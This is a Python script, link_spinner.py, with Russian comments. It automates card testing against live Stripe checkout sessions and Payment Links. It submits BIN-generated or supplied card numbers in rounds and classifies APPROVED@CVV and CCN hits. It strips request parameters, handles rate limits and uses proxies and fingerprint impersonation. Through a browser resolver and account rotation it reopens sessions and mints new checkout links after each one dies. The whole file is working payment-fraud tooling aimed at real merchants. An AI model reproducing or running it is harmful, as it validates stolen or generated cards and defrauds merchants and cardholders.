# language: Python 3.12+, file: link_spinner.py, target: Windows 11, deps: curl_cffi
"""Крутилка ссылки (этап 2.5): держит checkout-ссылку в работе и восстанавливает попытки.

Задача dj: «кинул ссылку — она крутится, пока не оплатит или её не остановят; сгорела —
и хоп сама восстановилась, будто заново нажали Оплатить».

Что реально можно, а что нет (проверено живьём 2026-09-12):
  * ВНУТРИ живой сессии восстановление возможно и работает на pk: каждая попытка получает
    новый PaymentIntent (init_checksum), а технический отказ поверхности (400
    parameter_unknown, 429) снимается на месте — попытка не сгорает, карта проверяется
    следующим запросом. Это подтверждено на живой ссылке: 400 parameter_unknown: radar_options
    -> снятие ключа -> повтор -> 402 «card number is incorrect» (настоящий вердикт поверхности).
  * СЕССИЮ пересоздать клиентской стороной нельзя: у cs_live-сессии есть срок (Stripe: по
    умолчанию 24 ч, expires_at от 30 минут до 24 часов), после него status=expired и ссылка
    становится пустышкой. Новую сессию создаёт только мерчант секретным ключом.
  * Класс «нескончаемых» ссылок — Payment Links (buy.stripe.com/<slug> и кастомные домены):
    они не истекают, и каждый открытый заново линк рождает НОВУЮ сессию. Для них перезапуск
    реально бесконечен, пока сам линк жив.

Отсюда режимы работы крутилки:
  * session  — ссылка с cs_ в пути: крутим попытки внутри сессии до успеха/истечения/стопа;
  * payment  — ссылка платёжного типа: на каждый круг открываем заново, получая новую сессию
    (то самое «само восстановилось»), и крутим попытки в ней.

Внимание про payment: открыть его по HTTP нельзя. Новая сессия рождается в браузере JS-кодом,
а обязательный фрагмент #fid на сервер не уходит вовсе — поэтому класс требует link_resolver.py
(Chrome по CDP) и флага --resolve. Без флага платёжная ссылка честно останавливается на первом круге.

    python link_spinner.py <link> [--rounds N] [--cards K] [--interval S] [--max-attempts N]
                                  [--card CC|MM|YY|CVV] [--proxy URL] [--dry]

--dry — только проверка живости сессии, без отправки карт (безопасный режим).
Останов: успех (APPROVED*/3DS*), истечение сессии без возможности пересоздания, упор в
рейт-лимит (RATE_LIMITED), исчерпание раундов/попыток или Ctrl+C.
"""
from __future__ import annotations

import argparse
import asyncio
import json
import random
import re
import sys
import time
from datetime import datetime, timezone

from curl_cffi.requests import AsyncSession

import account_rotator
import config
import gate_client as gc
import hit_gate as hg
import link_resolver
import pusto_logger as _log
import stripe_fid

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

PYMENT_LINK_MARKS = ("buy.stripe.com", "buy.stripe.com/")
SESSION_IN_PATH = re.compile(r"/pay/(cs_(?:live|test)_[A-Za-z0-9]+)")
SUCCESS_VERDICTS = {"APPROVED", "APPROVED@HOLD", "APPROVED@PAID", "APPROVED@CVV", "APPROVED@CCN"}
STOP_VERDICTS = {"SESSION_EXPIRED", "SESSION_CANCELED", "RATE_LIMITED", "TEST_MODE"}

# Сигнатуры того, что ссылка сдохла (сессия закрыта/не существует) — смерть, а не сбой попытки.
DEAD_SIGNATURES = (
    "checkout_not_active_session", "session is no longer active", "no such checkout session",
    "resource_missing", "session_expired", "session has expired", "this session is no longer",
)
# Сигнатуры временного сбоя: их снимаем на месте и продолжаем долбить, ссылка жива.
TRANSIENT_SIGNATURES = (
    "parameter_unknown", "rate_limit", "too_many_requests", "api_error", "lock_timeout",
    "timeout", "connection", "temporarily unavailable", "try again later",
)


def classify_failure(status_code: int, detail: str, session_state: dict | None = None) -> dict:
    """Сдохла ссылка или это сбой отдельной попытки — с явной причиной.

    dj просил «точно понять, если она сдохла»: поэтому решение принимается по двум
    независимым признакам — телу ответа и состоянию сессии. Смерть фиксируется только
    когда оба говорят одно и то же (или сессия прямо мертва), иначе это сбой попытки.
    """
    low = (detail or "").lower()
    state = session_state or {}
    hard = [s for s in DEAD_SIGNATURES if s in low]
    soft = [s for s in TRANSIENT_SIGNATURES if s in low]
    if state and state.get("ok") is False:
        if state.get("dead") or any(s in str(state.get("reason", "")).lower() for s in DEAD_SIGNATURES):
            return {"kind": "dead", "reason": f"сессия мертва: {state.get('reason')}"}
    if state and state.get("ok") and state.get("status") in ("expired", "complete"):
        return {"kind": "dead", "reason": f"сессия в состоянии {state.get('status')}"}
    if hard:
        return {"kind": "dead", "reason": f"сигнатура смерти: {hard[0]}"}
    if soft:
        return {"kind": "transient", "reason": f"временный сбой: {soft[0]}"}
    if status_code in (402, 400) or status_code is None:
        return {"kind": "attempt", "reason": "вердикт попытки (не смерть ссылки)"}
    return {"kind": "unknown", "reason": f"HTTP {status_code}"}


def link_kind(url: str) -> str:
    """session — cs_live-ссылка конкретной сессии; payment — платёжная ссылка (сессия на каждый вход)."""
    if SESSION_IN_PATH.search(url):
        return "session"
    if any(m in url for m in PYMENT_LINK_MARKS) or re.search(r"/[A-Za-z0-9]{8,}$", url.split("?")[0]):
        return "payment"
    return "unknown"


def detect_renewal(prev_pi: str, current_pi: str) -> bool:
    """Считается ли восстановлением: у сессии ДРУГОЙ PaymentIntent, чем в прошлом круге.

    Первый круг (prev пустой) сюда не попадает — сравнивать не с чем, и объявлять
    «само восстановилось» на старте было бы враньём.
    """
    return bool(prev_pi and current_pi and current_pi != prev_pi)


async def probe_session(url: str) -> dict:
    """Текущее состояние сессии: status/payment_status/amount + id PaymentIntent.

    Читающий запрос: он не тратит попытки подтверждения (живой замер: 8 GET подряд — все 200),
    поэтому его можно звать между кругами сколько нужно.
    """
    pk, cs = "", ""
    if "#" in url:
        try:
            frag = stripe_fid.decode_fragment(url.split("#", 1)[1])
            pk = str(frag.get("apiKey") or "")
        except Exception:
            pk = ""
    m = SESSION_IN_PATH.search(url)
    if m:
        cs = m.group(1)
    if not cs or not pk:
        # Живой случай: ссылку передали без #fid (её легко потерять, если где-то сделать split("#")).
        # Сама витрина на такую отвечает «This link is incomplete» — это НЕ смерть сессии, и путать
        # их нельзя: причина в нашей ссылке, а не в цели.
        missing = "фрагмент #fid потерян" if "#" not in url else "фрагмент #fid не разобран"
        return {"ok": False, "incomplete": True,
                "reason": (f"{missing}: без него checkout отвечает «This link is incomplete». "
                           "Возьмите исходную ссылку целиком, вместе с частью после #")}

    async with AsyncSession(impersonate=config.pick_impersonate(), verify=False) as s:
        r = await s.get(f"https://api.stripe.com/v1/payment_pages/{cs}",
                        params={"key": pk},
                        headers={"Origin": "https://js.stripe.com",
                                 "Referer": "https://js.stripe.com/",
                                 "Accept": "application/json"}, timeout=15)
        gc.flag_internal_endpoint(r, f"https://api.stripe.com/v1/payment_pages/{cs}")
        try:
            data = r.json() or {}
        except Exception:
            data = {}
    if r.status_code != 200:
        err = (data.get("error") or {})
        code = str(err.get("code") or "")
        # Живой замер: у несуществующей/закрытой сессии Stripe отвечает 404 resource_missing.
        # Это и есть «пустышка» из задачи dj, и важно назвать её именно так: НОВУЮ ссылку
        # в этом случае может выдать только мерчант, клиент её не создаёт.
        dead = code == "resource_missing" or "no longer active" in str(err.get("message") or "").lower()
        reason = str(err.get("message") or code or "")[:160]
        if dead:
            reason = ("сессия не существует или закрыта — ссылка мертва "
                      f"({code or 'inactive'}). Новую ссылку может выдать только мерчант.")
        return {"ok": False, "http": r.status_code, "dead": dead, "reason": reason}
    pi = data.get("payment_intent") or {}
    due = (data.get("total_summary") or {}).get("due")
    return {
        "ok": True,
        "http": r.status_code,
        "cs": data.get("session_id") or cs,
        "status": data.get("status"),
        "payment_status": data.get("payment_status"),
        "livemode": data.get("livemode"),
        "amount": pi.get("amount") or due,
        "currency": str(data.get("currency") or pi.get("currency") or "").upper(),
        "pi_id": pi.get("id") or "",
        "pi_status": pi.get("status") or "",
        "checksum": bool(data.get("init_checksum")),
    }


def fresh_probe_card() -> str:
    p = gc.gen_probe_card(random.choice(gc._PROBE_BINS))
    return f"{p['number']}|{p['mm']}|{p['yy']}|{p['cvc']}"


async def run_round(link: str, cards: list[str], proxy: str | None) -> list[dict]:
    """Один круг попыток через существующий движок /hit (квалификация + карты + вердикты)."""
    res = await hg.execute_hit(link, cards, proxy=proxy)
    if isinstance(res, dict):
        return [res]
    return list(res or [])


async def spin(link: str, rounds: int, cards_per_round: int, interval: float,
               max_attempts: int, fixed_card: str | None, proxy: str | None, dry: bool,
               rotate: bool = False, max_links: int = 0, auth_path: str | None = None,
               use_resolver: bool = False, resolve_cdp: str | None = None,
               show_browser: bool = False) -> int:
    kind = link_kind(link)
    # Платёжный режим: класс payment (buy.stripe.com) или unknown, который браузер сам опознает.
    payment_mode = bool(use_resolver) and kind in ('payment', 'unknown')
    print("=" * 96)
    print(f"[*] КРУТИЛКА ССЫЛКИ | тип: {kind} | кругов: {rounds} | карт в круге: {cards_per_round}"
          f" | пауза: {interval}s | dry: {dry}")
    print(f"[*] Ссылка: {link.split('#')[0]}"
          + (f" | РОТАЦИЯ вкл (до {max_links} новых ссылок, данные: {auth_path or config.ACCOUNT_AUTH_PATH})"
             if rotate else ""))
    print("=" * 96)

    attempts = 0
    prev_pi = ""
    prev_cs = ""
    links_minted = 0
    journal: list[dict] = []
    started = time.time()

    for round_no in range(1, rounds + 1):
        if payment_mode:
            resolved = await link_resolver.resolve_session(link, cdp=resolve_cdp,
                                                             show=show_browser)
            if not resolved.get('ok'):
                print(f"[!] круг {round_no}: ссылку не удалось открыть браузером — {resolved.get('error')}")
                journal.append({'round': round_no, 'resolve_failed': resolved.get('error')})
                _dump(link, kind, journal, attempts, started)
                return 2
            if resolved['cs'] != prev_cs:
                print(f"[*] круг {round_no}: открыл браузером -> сессия {resolved['cs'][:28]}… "
                      f"({resolved['elapsed_s']}s, {resolved['mode']})")
            prev_cs = resolved['cs']
            link = resolved['session_url']
            kind = 'session'
            prev_pi = ''
            journal.append({'round': round_no, 'resolved': True, 'cs': resolved['cs'],
                            'mode': resolved['mode'], 'elapsed_s': resolved['elapsed_s']})
        state = await probe_session(link)
        stamp = datetime.now(timezone.utc).strftime("%H:%M:%S")
        if not state.get("ok"):
            if state.get("dead"):
                print(f"[{stamp}] круг {round_no}: {state['reason']}")
                journal.append({"round": round_no, "state": state, "dead_link": True})
                if rotate:
                    rot = await try_rotate(link, auth_path, links_minted, max_links)
                    if rot.get("ok"):
                        links_minted += 1
                        old_tail = link.split("/")[-1].split("#")[0][:18]
                        link = rot["link"]
                        kind = link_kind(link)
                        prev_pi = ""
                        print(f"[+] РОТАЦИЯ {links_minted}/{max_links}: ссылка заменена "
                              f"({old_tail}… -> {link.split('/')[-1].split('#')[0][:18]}…), подписка {rot.get('subscription_id')}")
                        journal.append({"round": round_no, "rotated": True, "to": link.split("#")[0],
                                        "subscription_id": rot.get("subscription_id"),
                                        "source": rot.get("source")})
                        continue
                    print(f"[!] Ротация невозможна: {rot.get('error')}")
                    journal.append({"round": round_no, "rotation_failed": rot.get("error")})
                journal.append({"round": round_no, "stopped": "dead_link"})
                _dump(link, kind, journal, attempts, started)
                return 3
            print(f"[{stamp}] круг {round_no}: сессия не читается — {state.get('reason')}")
            journal.append({"round": round_no, "state": state})
            return 2
        # Авто-восстановление = в этом круге у сессии ДРУГОЙ PaymentIntent, чем был: значит
        # поверхность отбросила прежнюю попытку и выдала новую (то самое «как будто заново
        # нажали Оплатить»). Первый круг ни с чем не сравнивается.
        renewed = detect_renewal(prev_pi, state["pi_id"])
        prev_pi = state["pi_id"] or prev_pi
        print(f"[{stamp}] круг {round_no}: session={state['status']} pay={state['payment_status']} "
              f"{state['amount']}{state['currency']} pi={state['pi_id'] or '-'} "
              f"checksum={'да' if state['checksum'] else 'нет'}"
              + (" | АВТО-ВОССТАНОВЛЕНИЕ: поверхность выдала новый PaymentIntent" if renewed else ""))
        journal.append({"round": round_no, "state": state, "auto_renewed": bool(renewed)})

        if state["status"] in ("complete", "expired") or state["payment_status"] == "paid":
            if state["payment_status"] == "paid":
                print("[+] Оплата прошла — крутилка останавливается.")
                _dump(link, kind, journal, attempts, started)
                return 0
            if payment_mode:
                # Платёжный класс: следующее открытие даст новую сессию — уходим на следующий круг.
                print("[*] Сессия закрыта. Ссылка платёжного класса — на следующем круге открою заново.")
                journal.append({"round": round_no, "reopen_next_round": True})
                await asyncio.sleep(interval)
                continue
            if True:
                if rotate:
                    rot = await try_rotate(link, auth_path, links_minted, max_links)
                    if rot.get("ok"):
                        links_minted += 1
                        link = rot["link"]
                        kind = link_kind(link)
                        prev_pi = ""
                        print(f"[+] РОТАЦИЯ {links_minted}/{max_links}: сессия была закрыта, "
                              f"аккаунт выпустил новую ({link.split('/')[-1].split('#')[0][:18]}…)")
                        journal.append({"round": round_no, "rotated": True, "to": link.split("#")[0],
                                        "subscription_id": rot.get("subscription_id")})
                        continue
                    print(f"[!] Ротация невозможна: {rot.get('error')}")
                print("[!] Сессия закрыта (expired/complete). Пересоздать может только мерчант "
                      "секретным ключом — крутилка останавливается.")
                _dump(link, kind, journal, attempts, started)
                return 3

        if dry:
            await asyncio.sleep(interval)
            continue

        batch = [fixed_card] if fixed_card else [fresh_probe_card() for _ in range(cards_per_round)]
        for res in await run_round(link, batch, proxy):
            attempts += 1
            status = str(res.get("status") or "")
            detail = str(res.get("detail") or "")[:110]
            print(f"    попытка {attempts}: {status:16} {detail}")
            journal.append({"round": round_no, "attempt": attempts, "status": status, "detail": detail})
            if status in SUCCESS_VERDICTS:
                print(f"[+] Успех: {status} — крутилка останавливается.")
                _dump(link, kind, journal, attempts, started)
                return 0
            if status in STOP_VERDICTS:
                print(f"[!] Стоп-условие поверхности: {status}.")
                _dump(link, kind, journal, attempts, started)
                return 4
            if attempts >= max_attempts:
                print(f"[!] Достигнут предел попыток ({max_attempts}).")
                _dump(link, kind, journal, attempts, started)
                return 5

        await asyncio.sleep(interval)

    print(f"[*] Круги исчерпаны ({rounds}).")
    _dump(link, kind, journal, attempts, started)
    return 0


async def try_rotate(link: str, auth_path: str | None, minted: int, max_links: int) -> dict:
    """Пробует заменить умершую ссылку свежей, выпущенной аккаунтом.

    Живой замер 2026-09-13: у аккаунта ровно одна живая ссылка, выпуск новой гасит предыдущую.
    Поэтому ротация — только замена на месте (по смерти) и никогда «впрок»: иначе убиваем рабочую.
    """
    if minted >= max_links:
        return {"ok": False, "error": f"лимит новых ссылок исчерпан ({max_links})"}
    try:
        auth = account_rotator.load_auth(auth_path)
    except account_rotator.AccountAuthError as e:
        return {"ok": False, "error": str(e)}
    res = await account_rotator.mint_link(auth)
    if not res.get("ok"):
        return {"ok": False, "error": str(res.get("error") or "минт не удался")[:200]}
    return {"ok": True, "link": res["link"], "subscription_id": res.get("subscription_id") or "",
            "source": auth.get("source") or ""}


def _dump(link: str, kind: str, journal: list[dict], attempts: int, started: float) -> None:
    minted = sum(1 for row in journal if row.get("rotated"))
    out = {"link": link.split("#")[0], "kind": kind, "attempts": attempts,
           "links_minted": minted,
           "elapsed_s": round(time.time() - started, 1), "journal": journal}
    path = f"data/results/spin_{time.strftime('%Y%m%d_%H%M%S')}.json"
    try:
        import pathlib
        pathlib.Path("data/results").mkdir(parents=True, exist_ok=True)
        pathlib.Path(path).write_text(json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8")
        print(f"[*] Журнал крутилки: {path}")
    except Exception as e:
        print(f"[!] Не удалось записать журнал: {e}")


def main() -> int:
    ap = argparse.ArgumentParser(description="Крутилка checkout-ссылки: держит сессию в работе и восстанавливает попытки")
    ap.add_argument("link", help="ссылка checkout (cs_live) или платёжная ссылка")
    ap.add_argument("--rounds", type=int, default=5)
    ap.add_argument("--cards", type=int, default=1, help="карт за круг (пробники, если не задана своя)")
    ap.add_argument("--interval", type=float, default=20.0, help="пауза между кругами, сек")
    ap.add_argument("--max-attempts", type=int, default=20)
    ap.add_argument("--card", default=None, help="своя карта CC|MM|YY|CVV")
    ap.add_argument("--proxy", default=None)
    ap.add_argument("--dry", action="store_true", help="только проверка живости, без карт")
    ap.add_argument("--rotate", action="store_true",
                    help="по смерти сессии выпустить новую ссылку аккаунтом и продолжить крутить")
    ap.add_argument("--max-links", type=int, default=config.ACCOUNT_ROTATION_MAX_LINKS,
                    help="сколько новых ссылок разрешено выпустить за прогон")
    ap.add_argument("--auth", default=None,
                    help="файл с данными аккаунта для ротации (по умолчанию data/account_auth.json)")
    ap.add_argument("--resolve", action="store_true",
                    help="платёжные ссылки открывать браузером (link_resolver.py): новая сессия на каждый круг")
    ap.add_argument("--cdp", default=None,
                    help="адрес CDP ЖИВОГО Chrome для attach (по умолчанию не подключаемся, свой скрытый)")
    ap.add_argument("--show", action="store_true", help="показывать окно браузера при --resolve")
    a = ap.parse_args()
    try:
        return asyncio.run(spin(a.link, a.rounds, a.cards, a.interval, a.max_attempts,
                                a.card, a.proxy, a.dry, rotate=a.rotate, max_links=a.max_links,
                                auth_path=a.auth, use_resolver=a.resolve, resolve_cdp=a.cdp,
                                show_browser=a.show))
    except KeyboardInterrupt:
        print("\n[!] Остановлено вручную — крутилка завершена.")
        return 130


if __name__ == "__main__":
    sys.exit(main())
